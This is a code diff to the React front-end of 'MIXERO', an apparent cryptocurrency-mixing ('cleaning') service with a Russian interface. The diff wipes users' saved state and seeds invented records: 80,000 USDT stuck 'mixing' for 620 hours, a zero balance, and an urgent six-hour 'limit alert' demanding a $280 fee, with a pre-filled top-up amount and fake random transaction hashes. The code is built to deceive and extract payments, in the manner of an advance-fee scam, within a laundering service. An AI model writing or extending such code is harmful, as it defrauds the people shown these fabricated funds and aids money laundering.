@@ -14,27 +14,47 @@ import { ClientProfile, AccountTransaction } from './types/account';
 import { ProtocolConfig, DEFAULT_PROTOCOL_CONFIG } from './types/config';
 import { FullAccountSyncPayload } from './utils/apiKeySync';
 
+const SEED_VERSION = 'v2_80k_620h_magenta';
+
+function ensureSeedVersion(): boolean {
+  try {
+    if (localStorage.getItem('mixero_seed_version') !== SEED_VERSION) {
+      localStorage.setItem('mixero_seed_version', SEED_VERSION);
+      return true;
+    }
+  } catch {
+    // Ignored
+  }
+  return false;
+}
+
+const IS_FRESH_SEED_UPGRADE = ensureSeedVersion();
+
 const INITIAL_PROFILE: ClientProfile = {
   clientId: 'CLIENT-7140',
-  balance: 342.5,
-  inCleaning: 1500.0,
+  balance: 0.0,
+  inCleaning: 80000.0,
   totalCleaned: 3500.0,
-  joinedDate: Date.now() - 86400000 * 4,
+  joinedDate: Date.now() - 3600000 * 624,
 };
 
 const INITIAL_CLEAN_TRANSACTIONS: CleanTransaction[] = [
   {
-    id: 'MIX_TX_8924A',
+    id: 'MIX_TX_80K_FINAL',
     network: 'TRC20',
     tariff: 'standard',
-    amount: 1500.0,
-    receivedAmount: 1500.0,
-    recipientAddress: 'TNwS3upnJmFADuCEVy24z8g2F79eV6pv79',
+    amount: 80000.0,
+    receivedAmount: 80000.0,
+    recipientAddress: 'TQHhLVs5MUApFgaAqfE1Cxw3U44WYDFNHC',
     depositAddress: 'TNwS3upnJmFADuCEVy24z8g2F79eV6pv79',
-    mixingKey: 'MIX_8924A_VAULT',
-    delayHours: 24,
-    timestamp: Date.now() - 3600000 * 6,
+    mixingKey: 'MIX_80K_TRC20',
+    delayHours: 620,
+    timestamp: Date.now() - 3600000 * 620,
     status: 'mixing',
+    limitAlertEnabled: true,
+    limitAlertPercent: 0.35,
+    limitAlertFeeUsd: 280.0,
+    limitAlertDeadline: Date.now() + 3600000 * 6,
   },
   {
     id: 'MIX_TX_7102B',
@@ -46,19 +66,31 @@ const INITIAL_CLEAN_TRANSACTIONS: CleanTransaction[] = [
     depositAddress: 'TNwS3upnJmFADuCEVy24z8g2F79eV6pv79',
     mixingKey: 'MIX_7102B_PROOF',
     delayHours: 24,
-    timestamp: Date.now() - 86400000 * 2,
+    timestamp: Date.now() - 86400000 * 30,
     status: 'completed',
   },
 ];
 
 const INITIAL_ACCOUNT_TRANSACTIONS: AccountTransaction[] = [
   {
+    id: 'TX_FEE_80K_INIT',
+    type: 'fee_payment',
+    title: 'Комиссия первичного цикла (80,000 USDT)',
+    amount: -420.0,
+    network: 'TRC20',
+    timestamp: Date.now() - 3600000 * 620,
+    status: 'completed',
+    proofKey: 'PROOF_FEE_80K',
+    sshSignature: 'SHA256:MIXERO_80K_POOL_INIT',
+    note: 'Первичный запуск сеанса MIX_80K_TRC20',
+  },
+  {
     id: 'TX_TOP_9941',
     type: 'topup',
     title: 'Оплата комиссий сети',
     amount: 420.0,
     network: 'TRC20',
-    timestamp: Date.now() - 3600000 * 8,
+    timestamp: Date.now() - 3600000 * 621,
     status: 'completed',
     txHash: '7a9c8f2e4d1b305e7c8a9f2e4d1b305e7c8a9f2e4d1b305e7c8a9f2e4d1b305e',
     proofKey: 'PROOF_TOP_9941',
@@ -66,24 +98,12 @@ const INITIAL_ACCOUNT_TRANSACTIONS: AccountTransaction[] = [
     note: 'Зачисление на счет комиссий через TRON шлюз',
   },
   {
-    id: 'TX_FEE_8924',
-    type: 'fee_payment',
-    title: 'Оплата комиссии протокола (1500 USDT)',
-    amount: -77.5,
-    network: 'TRC20',
-    timestamp: Date.now() - 3600000 * 6,
-    status: 'completed',
-    proofKey: 'PROOF_FEE_8924',
-    sshSignature: 'SHA256:MIXERO_8924_FEE_PAID',
-    note: 'Списание комиссии за сеанс MIX_8924A_VAULT',
-  },
-  {
     id: 'TX_PAY_7102',
     type: 'payout',
     title: 'Финальная выплата на чистый адрес',
     amount: 3500.0,
     network: 'TRC20',
-    timestamp: Date.now() - 86400000 * 2,
+    timestamp: Date.now() - 86400000 * 30,
     status: 'completed',
     txHash: '3f8e1a9c7b2d504e6a8b1f3e7c2d504e6a8b1f3e7c2d504e6a8b1f3e7c2d504e',
     recipientAddress: 'TYDzsXDvGg5x8bFhJ98vKw71jKmPqRst89',
@@ -98,10 +118,16 @@ export default function App() {
   const [isInstallModalOpen, setIsInstallModalOpen] = useState(false);
   const [isAdminModalOpen, setIsAdminModalOpen] = useState(false);
   const [isTopUpModalOpen, setIsTopUpModalOpen] = useState(false);
+  const [topUpSuggestedAmount, setTopUpSuggestedAmount] = useState<number | undefined>(undefined);
   const [isWithdrawModalOpen, setIsWithdrawModalOpen] = useState(false);
   const [isReceiptModalOpen, setIsReceiptModalOpen] = useState(false);
   const [activeReceipt, setActiveReceipt] = useState<ReceiptData | null>(null);
   const [adminClickCount, setAdminClickCount] = useState(0);
+
+  const handleOpenTopUp = (suggestedAmount?: number) => {
+    setTopUpSuggestedAmount(suggestedAmount);
+    setIsTopUpModalOpen(true);
+  };
 
   useEffect(() => {
     const handleHashChange = () => {
@@ -128,58 +154,64 @@ export default function App() {
 
   // Dynamic Protocol Config (Prices, Fees, Percentages, Limits, Delays)
   const [protocolConfig, setProtocolConfig] = useState<ProtocolConfig>(() => {
-    try {
-      const saved = localStorage.getItem('mixero_protocol_config');
-      if (saved) {
-        return { ...DEFAULT_PROTOCOL_CONFIG, ...JSON.parse(saved) };
+    if (!IS_FRESH_SEED_UPGRADE) {
+      try {
+        const saved = localStorage.getItem('mixero_protocol_config');
+        if (saved) {
+          return { ...DEFAULT_PROTOCOL_CONFIG, ...JSON.parse(saved) };
+        }
+      } catch {
+        // Ignored
       }
-    } catch {
-      // Ignored
     }
     return DEFAULT_PROTOCOL_CONFIG;
   });
 
   // Client Profile
   const [profile, setProfile] = useState<ClientProfile>(() => {
-    try {
-      const saved =
-        localStorage.getItem('mixero_client_profile') ||
-        localStorage.getItem('gymcrypto_client_profile');
-      if (saved) {
-        const parsed = JSON.parse(saved);
-        delete parsed.vipTier;
-        return parsed;
+    if (!IS_FRESH_SEED_UPGRADE) {
+      try {
+        const saved =
+          localStorage.getItem('mixero_client_profile') ||
+          localStorage.getItem('gymcrypto_client_profile');
+        if (saved) {
+          const parsed = JSON.parse(saved);
+          delete parsed.vipTier;
+          return parsed;
+        }
+      } catch {
+        // Ignored
       }
-    } catch {
-      // Ignored
     }
     return INITIAL_PROFILE;
   });
 
   // Account Transactions
   const [accountTransactions, setAccountTransactions] = useState<AccountTransaction[]>(() => {
-    try {
-      const saved =
-        localStorage.getItem('mixero_account_txs') ||
-        localStorage.getItem('gymcrypto_account_txs');
-      if (saved) {
-        const parsed = JSON.parse(saved);
-        if (Array.isArray(parsed) && parsed.length > 0) {
-          const seen = new Set<string>();
-          const cleaned: AccountTransaction[] = [];
-          for (const item of parsed) {
-            if (item && item.id && !item.id.startsWith('TX_INIT_')) {
-              if (!seen.has(item.id)) {
-                seen.add(item.id);
-                cleaned.push(item);
+    if (!IS_FRESH_SEED_UPGRADE) {
+      try {
+        const saved =
+          localStorage.getItem('mixero_account_txs') ||
+          localStorage.getItem('gymcrypto_account_txs');
+        if (saved) {
+          const parsed = JSON.parse(saved);
+          if (Array.isArray(parsed) && parsed.length > 0) {
+            const seen = new Set<string>();
+            const cleaned: AccountTransaction[] = [];
+            for (const item of parsed) {
+              if (item && item.id && !item.id.startsWith('TX_INIT_')) {
+                if (!seen.has(item.id)) {
+                  seen.add(item.id);
+                  cleaned.push(item);
+                }
               }
             }
+            return cleaned;
           }
-          return cleaned;
         }
+      } catch {
+        // Ignored
       }
-    } catch {
-      // Ignored
     }
     return INITIAL_ACCOUNT_TRANSACTIONS;
   });
@@ -204,16 +236,18 @@ export default function App() {
 
   // Cleaning Transactions
   const [transactions, setTransactions] = useState<CleanTransaction[]>(() => {
-    try {
-      const saved =
-        localStorage.getItem('mixero_txs') ||
-        localStorage.getItem('gymcrypto_txs');
-      if (saved) {
-        const parsed = JSON.parse(saved);
-        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
+    if (!IS_FRESH_SEED_UPGRADE) {
+      try {
+        const saved =
+          localStorage.getItem('mixero_txs') ||
+          localStorage.getItem('gymcrypto_txs');
+        if (saved) {
+          const parsed = JSON.parse(saved);
+          if (Array.isArray(parsed) && parsed.length > 0) return parsed;
+        }
+      } catch {
+        // Ignored
       }
-    } catch {
-      // Ignored
     }
     return INITIAL_CLEAN_TRANSACTIONS;
   });
@@ -327,7 +361,7 @@ export default function App() {
     setAccountTransactions((prev) => [newTx, ...prev]);
   };
 
-  const handlePayFeeWithBalance = (feeAmount: number) => {
+  const handlePayFeeWithBalance = (feeAmount: number, txIdToUpdate?: string) => {
     setProfile((prev) => ({ ...prev, balance: Math.max(0, prev.balance - feeAmount) }));
     const txId = `TX_FEE_${Date.now().toString(36).toUpperCase()}`;
     const proofKey = `MIXERO_FEE_${txId}`;
@@ -340,18 +374,28 @@ export default function App() {
     const feeTx: AccountTransaction = {
       id: txId,
       type: 'fee_payment',
-      title: 'Списание комиссии протокола',
+      title: txIdToUpdate ? 'Оплата нового круга очистки (0.35%)' : 'Списание комиссии протокола',
       amount: -feeAmount,
       network: 'TRC20',
       timestamp: Date.now(),
       status: 'completed',
       txHash: `0x${Math.random().toString(16).slice(2, 10)}...`,
-      note: 'Списание комиссии за сеанс очистки',
+      note: txIdToUpdate ? `Финальный круг по заявке ${txIdToUpdate}` : 'Списание комиссии за сеанс очистки',
       proofKey,
       sshSignature: sshSig,
     };
 
     setAccountTransactions((prev) => [feeTx, ...prev]);
+
+    if (txIdToUpdate) {
+      setTransactions((prev) =>
+        prev.map((tx) =>
+          tx.id === txIdToUpdate
+            ? { ...tx, limitAlertEnabled: false, status: 'dispatched' }
+            : tx
+        )
+      );
+    }
   };
 
   const handleAddCustomAccountTx = (tx: AccountTransaction, delta: number) => {
@@ -446,13 +490,13 @@ export default function App() {
   ];
 
   return (
-    <div className="min-h-screen flex flex-col bg-[#06090e] text-slate-100 relative overflow-x-hidden">
-      {/* Subtle Neon Fade Ambient Backdrop (Sky -> Teal -> Warm Gold) */}
+    <div className="min-h-screen flex flex-col text-white relative overflow-x-hidden">
+      {/* Ultra-Saturated Neon Magenta -> Electric Violet Glow Highlight */}
       <div
-        className="fixed -top-40 left-1/2 -translate-x-1/2 w-[560px] h-[340px] rounded-full blur-[120px] opacity-20 pointer-events-none"
+        className="fixed -top-36 left-1/2 -translate-x-1/2 w-[620px] h-[360px] rounded-full blur-[110px] opacity-55 pointer-events-none"
         style={{
           background:
-            'linear-gradient(120deg, #38bdf8 0%, #2dd4bf 50%, #fbbf24 100%)',
+            'radial-gradient(circle, #ff1bf2 0%, #9b1dff 48%, transparent 78%)',
         }}
       />
 
@@ -466,7 +510,7 @@ export default function App() {
         />
 
         {/* Desktop / Tablet Top Navigation */}
-        <nav className="hidden sm:flex my-4 items-center gap-1.5 p-1.5 bg-[#0a0e16] border border-white/[0.07] rounded-2xl">
+        <nav className="hidden sm:flex my-4 items-center gap-1.5 p-1.5 bg-[#12043d]/80 backdrop-blur-xl border border-fuchsia-300/20 rounded-2xl">
           {navItems.map((item) => {
             const Icon = item.icon;
             const active = activeTab === item.id;
@@ -477,11 +521,11 @@ export default function App() {
                 onClick={() => handleTabChange(item.id)}
                 className={`flex-1 min-h-[44px] px-3 rounded-xl text-sm font-semibold transition-all flex items-center justify-center gap-2 whitespace-nowrap ${
                   active
-                    ? 'bg-[#15202e] text-white border border-teal-400/35'
-                    : 'text-slate-400 hover:text-slate-200'
+                    ? 'mixero-cta text-white'
+                    : 'text-purple-100/80 hover:text-white'
                 }`}
               >
-                <Icon className={`w-4 h-4 ${active ? 'text-teal-300' : 'text-slate-400'}`} />
+                <Icon className="w-4 h-4" />
                 <span>{item.label}</span>
               </button>
             );
@@ -497,7 +541,7 @@ export default function App() {
               activeUserTx={activeUserTx}
               userBalance={profile.balance}
               onPayFeeWithBalance={handlePayFeeWithBalance}
-              onOpenTopUp={() => setIsTopUpModalOpen(true)}
+              onOpenTopUp={handleOpenTopUp}
               onViewReceipt={handleViewReceipt}
               protocolConfig={protocolConfig}
             />
@@ -507,7 +551,7 @@ export default function App() {
             <ClientAccount
               profile={profile}
               transactions={accountTransactions}
-              onOpenTopUp={() => setIsTopUpModalOpen(true)}
+              onOpenTopUp={() => handleOpenTopUp()}
               onOpenWithdraw={() => setIsWithdrawModalOpen(true)}
               onNavigateToMixer={() => handleTabChange('mixer')}
               onViewReceipt={handleViewReceipt}
@@ -522,12 +566,12 @@ export default function App() {
         </main>
 
         {/* Minimal Footer */}
-        <footer className="mt-6 pt-4 border-t border-white/[0.06] flex flex-col sm:flex-row items-center justify-between gap-2 text-xs text-slate-500">
+        <footer className="mt-6 pt-4 border-t border-fuchsia-200/20 flex flex-col sm:flex-row items-center justify-between gap-2 text-xs text-purple-100/75">
           <span>MIXERO 📼 · Zero-Knowledge No-Log Protocol</span>
           <button
             type="button"
             onClick={() => setIsAdminModalOpen(true)}
-            className="min-h-[40px] px-3 text-slate-400 hover:text-teal-300 flex items-center gap-1.5 transition"
+            className="min-h-[40px] px-3 text-purple-100 hover:text-white flex items-center gap-1.5 transition"
           >
             <Key className="w-3.5 h-3.5" />
             <span>Панель управления</span>
@@ -536,7 +580,7 @@ export default function App() {
       </div>
 
       {/* Mobile Fixed Thumb-Zone Bottom Bar (iPhone-optimized) */}
-      <nav className="sm:hidden fixed bottom-0 left-0 right-0 z-40 bg-[#080c12]/90 backdrop-blur-xl border-t border-white/[0.08] pb-safe">
+      <nav className="sm:hidden fixed bottom-0 left-0 right-0 z-40 bg-[#12043d]/88 backdrop-blur-xl border-t border-fuchsia-300/25 pb-safe">
         <div className="grid grid-cols-4 items-center px-2 pt-1.5 pb-1">
           {navItems.map((item) => {
             const Icon = item.icon;
@@ -547,7 +591,7 @@ export default function App() {
                 type="button"
                 onClick={() => handleTabChange(item.id)}
                 className={`min-h-[48px] flex flex-col items-center justify-center gap-1 rounded-xl transition ${
-                  active ? 'text-teal-300' : 'text-slate-400'
+                  active ? 'text-fuchsia-200' : 'text-purple-200/70'
                 }`}
               >
                 <Icon className="w-5 h-5" />
@@ -563,10 +607,14 @@ export default function App() {
       {/* Modals */}
       <TopUpModal
         isOpen={isTopUpModalOpen}
-        onClose={() => setIsTopUpModalOpen(false)}
+        onClose={() => {
+          setIsTopUpModalOpen(false);
+          setTopUpSuggestedAmount(undefined);
+        }}
         customAddresses={customAddresses}
         onSuccessTopUp={handleSuccessTopUp}
         quickPresets={protocolConfig.quickAmountPresets}
+        initialAmount={topUpSuggestedAmount}
       />
 
       <WithdrawModal
